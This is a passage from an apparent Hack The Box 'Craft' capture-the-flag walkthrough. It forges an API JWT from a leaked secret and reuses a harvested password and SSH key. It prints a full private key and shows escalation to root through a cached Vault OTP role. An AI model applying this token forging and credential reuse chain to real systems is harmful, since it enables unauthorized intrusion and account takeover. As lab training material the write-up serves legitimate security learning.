+RESTPLUS_ERROR_404_HELP = False
+CRAFT_API_SECRET = 'hz66OCkDtv8G6D'
+
+# database
+MYSQL_DATABASE_USER = 'craft'
+MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
+MYSQL_DATABASE_DB = 'craft'
+MYSQL_DATABASE_HOST = 'db'
+SQLALCHEMY_TRACK_MODIFICATIONS = False
+===================================================================================================================================
+
+We can craft our own tokens with the secret:
+CRAFT_API_SECRET = 'hz66OCkDtv8G6D'
+We need to first install jwt:
+pip3 install pyjwt
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/craft/craft-api/tests]
+└──╼ $python3
+Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
+[GCC 10.2.1 20210110] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import jwt
+>>> secret = 'hz66OCkDtv8G6D'
+>>> encoded_jwt = jwt.encode({'user':'user','exp':'1720866936'}, secret, algorithm='HS256')
+>>> encoded_jwt
+'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6IjE3MjA4NjY5MzYifQ.5bPFXp0DNC8hMJVy9PbvLyKpmd2B7q3PfJvsKcVBTRM'
+===================================================================================================================================
+
+Now that we have a token we don't actually need dineshs creds we just need to supply the token.
+We copy the test.py to auth.py and modify the code so that only the token is supplied.
+Commands and Output:
+===================================================================================================================================
+#!/usr/bin/env python
+
+import requests
+import json
+
+requests.packages.urllib3.disable_warnings()
+
+token =  'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6IjE3MjA4NjY5MzYifQ.5bPFXp0DNC8hMJVy9PbvLyKpmd2B7q3PfJvsKcVBTRM'
+
+headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }
+
+# make sure token is valid
+response = requests.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False)
+print(response.text)
+
+..
+..
+..
+
+┌─[user@parrot-virtual]─[~/htb/craft/craft-api/tests]
+└──╼ $python3 auth.py 
+{"message":"Token is valid!"}
+
+===================================================================================================================================
+
+So we could follow the same steps to get the reverse shell without the creds we skip the middle man.
+
+Now after the detour we can try logging in with one of the creds. The only one that works is gilfoyles.
+
+Commands and Output:
+===================================================================================================================================
+{'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}
+===================================================================================================================================
+
+There is also a private repo from gilfoyle, unfortunately gilfoyle is not an admin so we can't create a post hook.
+
+Let's copy the repo why copying an ssh key we have to his settings on gogs.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/craft/ssh/gilfoyle]
+└──╼ $ssh-keygen -t rsa -f gilfoyle
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in gilfoyle
+Your public key has been saved in gilfoyle.pub
+The key fingerprint is:
+SHA256:zQVAmY8ltWLz3ihe9pCCYQGqtde4uaGOMsIR3SKeTeo user@parrot-virtual
+The key's randomart image is:
++---[RSA 3072]----+
+|    .  .o=o      |
+|   . .  + .o     |
+|  + . . +=. .    |
+| = = + o.*..     |
+|o O + + S +      |
+| = o + o . +     |
+|o . + . o B .    |
+|+E . o . = o     |
+|+oo .   .   .    |
++----[SHA256]-----+
+┌─[user@parrot-virtual]─[~/htb/craft/ssh/gilfoyle]
+└──╼ $ls
+gilfoyle  gilfoyle.pub
+┌─[user@parrot-virtual]─[~/htb/craft/ssh/gilfoyle]
+└──╼ $cat gilfoyle.pub |c
+===================================================================================================================================
+
+Now that we have inserted the public key, we can try to git, but first we need to modify our ssh conifg located:
+~/.ssh/config
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/craft]
+└──╼ $cat !$
+cat ~/.ssh/config
+HOST gogs.craft.htb
+    HOSTNAME gogs.craft.htb
+    IdentityFile /home/user/htb/craft/ssh/gilfoyle/gilfoyle
+===================================================================================================================================
+
+Now we can git clone the repo
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/craft/ssh/gilfoyle]
+└──╼ $git clone ssh://git@gogs.craft.htb:6022/gilfoyle/craft-infra.git
+Cloning into 'craft-infra'...
+remote: Enumerating objects: 23, done.
+remote: Counting objects: 100% (23/23), done.
+remote: Compressing objects: 100% (20/20), done.
+remote: Total 23 (delta 4), reused 0 (delta 0)
+Receiving objects: 100% (23/23), 5.92 KiB | 5.92 MiB/s, done.
+===================================================================================================================================
+
+Now we can use our previous tools to see if we can extract anything.
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/craft/ssh/gilfoyle/craft-infra]
+└──╼ $gitleaks -v --path=$(pwd)
+INFO[0000] opening /home/user/htb/craft/ssh/gilfoyle/craft-infra 
+{
+	"line": "-----BEGIN OPENSSH PRIVATE KEY-----",
+	"lineNumber": 1,
+	"offender": "-----BEGIN OPENSSH PRIVATE KEY-----",
+	"offenderEntropy": -1,
+	"commit": "84736fb39dfa92d06910a130b9577a193ae608a9",
+	"repo": "craft-infra",
+	"repoURL": "",
+	"leakURL": "",
+	"rule": "Asymmetric Private Key",
+	"commitMessage": "Commit infrastructure configs\n",
+	"author": "gilfoyle",
+	"email": "gilfoyle@craft.htb",
+	"file": ".ssh/id_rsa",
+	"date": "2019-02-09T22:45:26-05:00",
+	"tags": "key, AsymmetricPrivateKey"
+}
+INFO[0000] scan time: 9 milliseconds 283 microseconds   
+INFO[0000] commits scanned: 3                           
+WARN[0000] leaks found: 1              
+===================================================================================================================================
+
+We can try truffle hog and it finds more
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/craft/ssh/gilfoyle/craft-infra]
+└──╼ $trufflehog file://$(pwd)
+~~~~~~~~~~~~~~~~~~~~~
+Reason: High Entropy
+Date: 2019-02-09 19:45:26
+Hash: 84736fb39dfa92d06910a130b9577a193ae608a9
+Filepath: .ssh/id_rsa
+Branch: origin/master
+Commit: Commit infrastructure configs
+
+@@ -0,0 +1,28 @@
++-----BEGIN OPENSSH PRIVATE KEY-----
++b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDD9Lalqe
++qF/F3X76qfIGkIAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDSkCF7NV2Z
++F6z8bm8RaFegvW2v58stknmJK9oS54ZdUzH2jgD0bYauVqZ5DiURFxIwOcbVK+jB39uqrS
++zU0aDPlyNnUuUZh1Xdd6rcTDE3VU16roO918VJCN+tIEf33pu2VtShZXDrhGxpptcH/tfS
++RgV86HoLpQ0sojfGyIn+4sCg2EEXYng2JYxD+C1o4jnBbpiedGuqeDSmpunWA82vwWX4xx
++lLNZ/ZNgCQTlvPMgFbxCAdCTyHzyE7KI+0Zj7qFUeRhEgUN7RMmb3JKEnaqptW4tqNYmVw
++pmMxHTQYXn5RN49YJQlaFOZtkEndaSeLz2dEA96EpS5OJl0jzUThAAAD0JwMkipfNFbsLQ
++B4TyyZ/M/uERDtndIOKO+nTxR1+eQkudpQ/ZVTBgDJb/z3M2uLomCEmnfylc6fGURidrZi
++4u+fwUG0Sbp9CWa8fdvU1foSkwPx3oP5YzS4S+m/w8GPCfNQcyCaKMHZVfVsys9+mLJMAq
++Rz5HY6owSmyB7BJrRq0h1pywue64taF/FP4sThxknJuAE+8BXDaEgjEZ+5RA5Cp4fLobyZ
++3MtOdhGiPxFvnMoWwJLtqmu4hbNvnI0c4m9fcmCO8XJXFYz3o21Jt+FbNtjfnrIwlOLN6K
++Uu/17IL1vTlnXpRzPHieS5eEPWFPJmGDQ7eP+gs/PiRofbPPDWhSSLt8BWQ0dzS8jKhGmV
++ePeugsx/vjYPt9KVNAN0XQEA4tF8yoijS7M8HAR97UQHX/qjbna2hKiQBgfCCy5GnTSnBU
++GfmVxnsgZAyPhWmJJe3pAIy+OCNwQDFo0vQ8kET1I0Q8DNyxEcwi0N2F5FAE0gmUdsO+J5
++0CxC7XoOzvtIMRibis/t/jxsck4wLumYkW7Hbzt1W0VHQA2fnI6t7HGeJ2LkQUce/MiY2F
++5TA8NFxd+RM2SotncL5mt2DNoB1eQYCYqb+fzD4mPPUEhsqYUzIl8r8XXdc5bpz2wtwPTE
++cVARG063kQlbEPaJnUPl8UG2oX9LCLU9ZgaoHVP7k6lmvK2Y9wwRwgRrCrfLREG56OrXS5
++elqzID2oz1oP1f+PJxeberaXsDGqAPYtPo4RHS0QAa7oybk6Y/ZcGih0ChrESAex7wRVnf
++CuSlT+bniz2Q8YVoWkPKnRHkQmPOVNYqToxIRejM7o3/y9Av91CwLsZu2XAqElTpY4TtZa
++hRDQnwuWSyl64tJTTxiycSzFdD7puSUK48FlwNOmzF/eROaSSh5oE4REnFdhZcE4TLpZTB
++a7RfsBrGxpp++Gq48o6meLtKsJQQeZlkLdXwj2gOfPtqG2M4gWNzQ4u2awRP5t9AhGJbNg
++MIxQ0KLO+nvwAzgxFPSFVYBGcWRR3oH6ZSf+iIzPR4lQw9OsKMLKQilpxC6nSVUPoopU0W
++Uhn1zhbr+5w5eWcGXfna3QQe3zEHuF3LA5s0W+Ql3nLDpg0oNxnK7nDj2I6T7/qCzYTZnS
++Z3a9/84eLlb+EeQ9tfRhMCfypM7f7fyzH7FpF2ztY+j/1mjCbrWiax1iXjCkyhJuaX5BRW
++I2mtcTYb1RbYd9dDe8eE1X+C/7SLRub3qdqt1B0AgyVG/jPZYf/spUKlu91HFktKxTCmHz
++6YvpJhnN2SfJC/QftzqZK2MndJrmQ=
++-----END OPENSSH PRIVATE KEY-----
+
+~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~
+Reason: High Entropy
+Date: 2019-02-09 19:45:26
+Hash: 84736fb39dfa92d06910a130b9577a193ae608a9
+Filepath: .ssh/id_rsa.pub
+Branch: origin/master
+Commit: Commit infrastructure configs
+
+@@ -0,0 +1 @@
++ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSkCF7NV2ZF6z8bm8RaFegvW2v58stknmJK9oS54ZdUzH2jgD0bYauVqZ5DiURFxIwOcbVK+jB39uqrSzU0aDPlyNnUuUZh1Xdd6rcTDE3VU16roO918VJCN+tIEf33pu2VtShZXDrhGxpptcH/tfSRgV86HoLpQ0sojfGyIn+4sCg2EEXYng2JYxD+C1o4jnBbpiedGuqeDSmpunWA82vwWX4xxlLNZ/ZNgCQTlvPMgFbxCAdCTyHzyE7KI+0Zj7qFUeRhEgUN7RMmb3JKEnaqptW4tqNYmVwpmMxHTQYXn5RN49YJQlaFOZtkEndaSeLz2dEA96EpS5OJl0jzUTh gilfoyle@craft.htb
+
+~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~
+Reason: High Entropy
+Date: 2019-02-09 19:45:26
+Hash: 84736fb39dfa92d06910a130b9577a193ae608a9
+Filepath: vault/Dockerfile
+Branch: origin/master
+Commit: Commit infrastructure configs
+
+@@ -0,0 +1,73 @@
++FROM alpine:3.8
++
++# This is the release of Vault to pull in.
++ENV VAULT_VERSION=0.11.1
++
++# Create a vault user and group first so the IDs get set the same way,
++# even as the rest of this may change over time.
++RUN addgroup vault && \
++    adduser -S -G vault vault
++
++# Set up certificates, our base tools, and Vault.
++RUN set -eux; \
++    apk add --no-cache ca-certificates gnupg openssl libcap su-exec dumb-init && \
++    apkArch="$(apk --print-arch)"; \
++    case "$apkArch" in \
++        armhf) ARCH='arm' ;; \
++        aarch64) ARCH='arm64' ;; \
++        x86_64) ARCH='amd64' ;; \
++        x86) ARCH='386' ;; \ 
++        *) echo >&2 "error: unsupported architecture: $apkArch"; exit 1 ;; \
++    esac && \
++    VAULT_GPGKEY=91A6E7F85D05C65630BEF18951852D87348FFC4C; \
++    found=''; \
++    for server in \
++        hkp://p80.pool.sks-keyservers.net:80 \
++        hkp://keyserver.ubuntu.com:80 \
++        hkp://pgp.mit.edu:80 \
++    ; do \
++        echo "Fetching GPG key $VAULT_GPGKEY from $server"; \
++        gpg --keyserver "$server" --recv-keys "$VAULT_GPGKEY" && found=yes && break; \
++    done; \
++    test -z "$found" && echo >&2 "error: failed to fetch GPG key $VAULT_GPGKEY" && exit 1; \
++    mkdir -p /tmp/build && \
++    cd /tmp/build && \
++    wget https://releases.hashicorp.com/vault/${VAULT_VERSION}/vault_${VAULT_VERSION}_linux_${ARCH}.zip && \
++    wget https://releases.hashicorp.com/vault/${VAULT_VERSION}/vault_${VAULT_VERSION}_SHA256SUMS && \
++    wget https://releases.hashicorp.com/vault/${VAULT_VERSION}/vault_${VAULT_VERSION}_SHA256SUMS.sig && \
++    gpg --batch --verify vault_${VAULT_VERSION}_SHA256SUMS.sig vault_${VAULT_VERSION}_SHA256SUMS && \
++    grep vault_${VAULT_VERSION}_linux_${ARCH}.zip vault_${VAULT_VERSION}_SHA256SUMS | sha256sum -c && \
++    unzip -d /bin vault_${VAULT_VERSION}_linux_${ARCH}.zip && \
++    cd /tmp && \
++    rm -rf /tmp/build && \
++    gpgconf --kill dirmngr && \
++    gpgconf --kill gpg-agent && \
++    apk del gnupg openssl && \
++    rm -rf /root/.gnupg
++
++# /vault/logs is made available to use as a location to store audit logs, if
++# desired; /vault/file is made available to use as a location with the file
++# storage backend, if desired; the server will be started with /vault/config as
++# the configuration directory so you can add additional config files in that
++# location.
++RUN mkdir -p /vault/logs && \
++    mkdir -p /vault/file && \
++    mkdir -p /vault/config && \
++    chown -R vault:vault /vault
++
++# 8200/tcp is the primary interface that applications use to interact with
++# Vault.
++EXPOSE 8200
++
++# The entry point script uses dumb-init as the top-level process to reap any
++# zombie processes created by Vault sub-processes.
++#
++# For production derivatives of this container, you shoud add the IPC_LOCK
++# capability so that Vault can mlock memory.
++COPY docker-entrypoint.sh /usr/local/bin/docker-entrypoint.sh
++RUN chmod 777 /usr/local/bin/docker-entrypoint.sh
++ENTRYPOINT ["docker-entrypoint.sh"]
++
++# By default you'll get a single-node development server that stores everything
++# in RAM and bootstraps itself. Don't use this configuration for production.
++CMD ["server", "-dev"]
+\ No newline at end of file
+
+~~~~~~~~~~~~~~~~~~~~~
+===================================================================================================================================
+
+We can try a git log with a git diff to see what was recently added.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/craft/ssh/gilfoyle/craft-infra]
+└──╼ $git log
+commit 72bd340e48bd5565fd6c388deb124f39a93d5879 (HEAD -> master, origin/master, origin/HEAD)
+Author: gilfoyle <gilfoyle@craft.htb>
+Date:   Sun Feb 10 01:11:56 2019 -0500
+
+    Add script to enable secrets backend
+
+commit a7efd4ceac88644ba3f49a398e77fa95c8d34f81
+Author: gilfoyle <gilfoyle@craft.htb>
+Date:   Sat Feb 9 23:17:37 2019 -0500
+
+    Disable vault ui
+
+commit 84736fb39dfa92d06910a130b9577a193ae608a9
+Author: gilfoyle <gilfoyle@craft.htb>
+Date:   Sat Feb 9 22:45:26 2019 -0500
+
+    Commit infrastructure configs
+┌─[user@parrot-virtual]─[~/htb/craft/ssh/gilfoyle/craft-infra]
+└──╼ $git diff a7efd4ceac88644ba3f49a398e77fa95c8d34f81
+diff --git a/vault/secrets.sh b/vault/secrets.sh
+new file mode 100644
+index 0000000..3d57041
+--- /dev/null
++++ b/vault/secrets.sh
+@@ -0,0 +1,10 @@
++#!/bin/bash
++
++# set up vault secrets backend
++
++vault secrets enable ssh
++
++vault write ssh/roles/root_otp \
++    key_type=otp \
++    default_user=root \
++    cidr_list=0.0.0.0/0
+===================================================================================================================================
+
+There is probably something interesting in vault once we get in. We can try and ssh using the private key we found.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/craft/ssh/gilfoyle/craft-infra]
+└──╼ $find . -name .ssh
+./.ssh
+┌─[user@parrot-virtual]─[~/htb/craft/ssh/gilfoyle/craft-infra]
+└──╼ $ls -la
+total 4
+drwxr-xr-x 1 user user  104 May 12 18:13 .
+drwxr-xr-x 1 user user   62 May 12 18:13 ..
+drwxr-xr-x 1 user user   20 May 12 18:13 craft-flask
+-rw-r--r-- 1 user user 1116 May 12 18:13 docker-compose.yml
+drwxr-xr-x 1 user user  138 May 12 18:13 .git
+drwxr-xr-x 1 user user   18 May 12 18:13 mysql
+drwxr-xr-x 1 user user   20 May 12 18:13 nginx
+drwxr-xr-x 1 user user   32 May 12 18:13 .ssh
+drwxr-xr-x 1 user user   60 May 12 18:13 vault
+┌─[user@parrot-virtual]─[~/htb/craft/ssh/gilfoyle/craft-infra]
+└──╼ $cd .ssh
+┌─[user@parrot-virtual]─[~/htb/craft/ssh/gilfoyle/craft-infra/.ssh]
+└──╼ $ls
+id_rsa  id_rsa.pub
+┌─[user@parrot-virtual]─[~/htb/craft/ssh/gilfoyle/craft-infra/.ssh]
+└──╼ $ls
+id_rsa  id_rsa.pub
+┌─[user@parrot-virtual]─[~/htb/craft/ssh/gilfoyle/craft-infra/.ssh]
+└──╼ $chmod 600 *
+┌─[user@parrot-virtual]─[~/htb/craft/ssh/gilfoyle/craft-infra/.ssh]
+└──╼ $ssh gilfoyle@10.10.10.110 -i id_rsa 
+
+
+  .   *   ..  . *  *
+*  * @()Ooc()*   o  .
+    (Q@*0CG*O()  ___
+   |\_________/|/ _ \
+   |  |  |  |  | / | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | \_| |
+   |  |  |  |  |\___/
+   |\_|__|__|_/|
+    \_________/
+
+
+
+Enter passphrase for key 'id_rsa': 
+Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Apr 14 12:29:21 2021 from 10.10.14.4
+gilfoyle@craft:~$ 
+===================================================================================================================================
+
+
+We use gilfoyle previous database password as the passphrase:
+ZEU3N8WNM2rh4T
+
+We can now try and enumerate with linpeas, nothing too interesting except we come to see a vault file, along with ssh enabled.
+Commands and Output:
+===================================================================================================================================
+
+[+] Searching ssl/ssh files
+/home/gilfoyle/.ssh/authorized_keys
+/home/gilfoyle/.ssh/known_hosts
+PermitRootLogin yes
+PasswordAuthentication no
+PermitEmptyPasswords no
+ChallengeResponseAuthentication yes
+UsePAM yes
+  --> Some certificates were found (out limited):
+/etc/vmware-tools/GuestProxyData/server/cert.pem
+/usr/local/share/ca-certificates/rootCA.crt
+
+ --> /etc/hosts.allow file found, read the rules:
+/etc/hosts.allow
+
+
+Searching inside /etc/ssh/ssh_config for interesting info
+Host *
+    SendEnv LANG LC_*
+    HashKnownHosts yes
+    GSSAPIAuthentication yes
+
+[+] Searching unexpected auth lines in /etc/pam.d/sshd
+auth requisite pam_exec.so quiet expose_authtok log=/var/log/vaultssh.log /usr/local/bin/vault-ssh-helper -config=/usr/local/etc/vault-ssh-helper.hcl
+auth optional pam_unix.so not_set_pass use_first_pass nodelay
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+[+] Searching Vault-ssh files
+/usr/local/etc/vault-ssh-helper.hcl
+vault_addr = "https://172.20.0.2:8200"
+ssh_mount_point = "ssh"
+tls_skip_verify = true
+allowed_roles = "*"
+
+Path          Type         Accessor              Description
+----          ----         --------              -----------
+cubbyhole/    cubbyhole    cubbyhole_ffc9a6e5    per-token private secret storage
+identity/     identity     identity_56533c34     identity store
+secret/       kv           kv_2d9b0109           key/value secret storage
+ssh/          ssh          ssh_3bbd5276          n/a
+sys/          system       system_477ec595       system endpoints used for control, policy and debugging
+/home/gilfoyle/.vault-token
+===================================================================================================================================
+
+We see more ssh keys we might be able to use. Google vault token file.
+Looks like cached credentials in vault:
+Reference: https://www.vaultproject.io/docs/commands/ssh
+
+If we go back to guilfoyles private repo in the git config
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/craft/ssh/gilfoyle/craft-infra/vault]
+└──╼ $cat secrets.sh 
+#!/bin/bash
+
+# set up vault secrets backend
+
+vault secrets enable ssh
+
+vault write ssh/roles/root_otp \
+    key_type=otp \
+    default_user=root \
+    cidr_list=0.0.0.0/0
+===================================================================================================================================
+
+After looking at the documentation since the info is already cached all you need to do is pecify the following and paste output
+back as the passphrase for root.
+Commands and Output:
+===================================================================================================================================
+Vault could not locate "sshpass". The OTP code for the session is displayed
+below. Enter this code in the SSH password prompt. If you install sshpass,
+Vault can automatically perform this step for you.
+OTP for the session is: dc1242b3-0ab9-37a3-b18d-2c881c44fac7
+
+
+  .   *   ..  . *  *
+*  * @()Ooc()*   o  .
+    (Q@*0CG*O()  ___
+   |\_________/|/ _ \
+   |  |  |  |  | / | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | \_| |
+   |  |  |  |  |\___/
+   |\_|__|__|_/|
+    \_________/
+
+
+
+Password: 
+Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Apr 14 12:30:30 2021 from 10.10.10.110
+root@craft:~# whoami
+root
+===================================================================================================================================
+
+
